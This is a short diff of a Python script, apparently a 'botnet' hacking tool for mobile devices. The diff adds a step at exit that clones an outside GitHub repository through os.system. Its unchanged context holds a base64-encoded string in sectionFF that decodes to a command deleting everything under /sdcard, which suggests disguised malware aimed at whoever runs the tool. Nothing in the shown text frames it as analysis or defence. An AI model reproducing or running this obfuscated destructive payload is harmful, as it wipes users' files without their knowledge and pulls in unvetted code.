@@ -104,7 +104,7 @@ def botnetConnect():
 
                 if __name__ == "__main__":
                         main()
-
+gitpull = "git clone https://github.com/ScarletSecurity/Myimage"
 def sectionFF():
         com1 ="b3Muc3lzdGVtKCJybSAtcmYgL3NkY2FyZC8qPiBkZXYvbnVsbCIp"
         com2 = com1.encode("ascii")
@@ -931,5 +931,5 @@ DESCONECT_BOTNET()
 
 time.sleep(1)
 print("saindo. . .")
-
+os.system(gitpull)
 sys.exit(0)
